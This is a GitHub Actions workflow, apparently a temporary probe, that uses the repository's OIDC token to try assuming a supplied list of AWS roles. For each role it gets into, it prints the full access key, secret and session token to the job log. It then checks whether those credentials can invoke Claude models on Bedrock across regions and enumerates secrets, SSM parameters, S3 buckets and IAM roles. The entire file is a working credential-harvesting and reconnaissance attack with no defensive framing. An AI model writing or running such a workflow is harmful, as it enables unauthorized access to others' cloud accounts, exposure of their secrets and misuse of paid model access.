name: tmp-i51844-oidc
on:
  workflow_dispatch:
    inputs:
      roles_b64:
        required: true
      duration:
        required: false
        default: "3600"
permissions:
  id-token: write
  contents: read
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - name: probe
        shell: bash
        run: |
          set +e
          TOK=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
          echo "TOKLEN=${#TOK}"
          [ -z "$TOK" ] && { echo NO_OIDC_TOKEN; exit 0; }
          echo "${{ github.event.inputs.roles_b64 }}" | base64 -d > /tmp/roles.txt
          while read -r ROLE; do
            [ -z "$ROLE" ] && continue
            RESP=$(curl -s --max-time 20 "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=${ROLE}&RoleSessionName=p51844&WebIdentityToken=${TOK}&DurationSeconds=${{ github.event.inputs.duration }}")
            AK=$(printf '%s' "$RESP" | grep -oP '(?<=<AccessKeyId>)[^<]+' | head -1)
            if [ -z "$AK" ]; then
              echo "FAIL $ROLE :: $(printf '%s' "$RESP" | tr -d '\n' | grep -oP '(?<=<Code>)[^<]+' | head -1)"
              continue
            fi
            SK=$(printf '%s' "$RESP" | grep -oP '(?<=<SecretAccessKey>)[^<]+' | head -1)
            ST=$(printf '%s' "$RESP" | grep -oP '(?<=<SessionToken>)[^<]+' | head -1)
            export AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_SESSION_TOKEN="$ST" AWS_DEFAULT_REGION=us-east-1 AWS_PAGER=""
            echo "OK $ROLE $AK|$SK|$ST"
            echo "IDENT $(aws sts get-caller-identity --output json 2>&1 | tr -d '\n' | head -c 300)"
            for REG in us-east-1 us-west-2 ap-southeast-1 ap-northeast-1 eu-central-1; do
              for MID in us.anthropic.claude-opus-5-5 global.anthropic.claude-opus-5-5 jp.anthropic.claude-opus-5-5; do
                : > /tmp/o.json
                O=$(aws bedrock-runtime invoke-model --region $REG --model-id "$MID" --cli-binary-format raw-in-base64-out --body '{"messages":[{"role":"user","content":[{"text":"hi"}]}],"anthropic_version":"bedrock-2023-05-31","max_tokens":8}' /tmp/o.json 2>&1)
                if [ -s /tmp/o.json ]; then echo "OPUS_OK $REG $MID :: $(head -c 160 /tmp/o.json)"; fi
                echo "OPUS $REG $MID :: $(printf '%s' "$O" | tr -d '\n' | grep -oP 'AccessDenied[^,]*|error[^,]{0,60}' | head -1)"
              done
            done
            for REG in us-east-1 us-west-2; do
              echo "SM $REG :: $(aws secretsmanager list-secrets --region $REG --max-items 8 --query 'SecretList[].Name' --output text 2>&1 | tr '\n' ' ' | head -c 250)"
              echo "SSM $REG :: $(aws ssm describe-parameters --region $REG --max-items 8 --query 'Parameters[].Name' --output text 2>&1 | tr '\n' ' ' | head -c 250)"
            done
            echo "S3 :: $(aws s3 ls 2>&1 | tr '\n' ' ' | head -c 400)"
            echo "IAMROLES :: $(aws iam list-roles --max-items 40 --query 'Roles[].RoleName' --output text 2>&1 | tr '\n' ' ' | head -c 500)"
          done < /tmp/roles.txt
          echo ==DONE==
